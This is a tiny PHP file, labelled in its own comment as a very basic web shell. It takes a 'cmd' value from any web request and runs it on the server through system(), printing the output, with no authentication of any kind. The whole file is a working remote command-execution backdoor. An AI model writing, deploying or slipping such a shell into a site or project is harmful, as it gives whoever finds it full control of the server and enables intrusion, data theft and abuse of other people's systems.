<?php
// Very basic PHP web shell
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
} else {
    echo "No command provided.";
}
?>
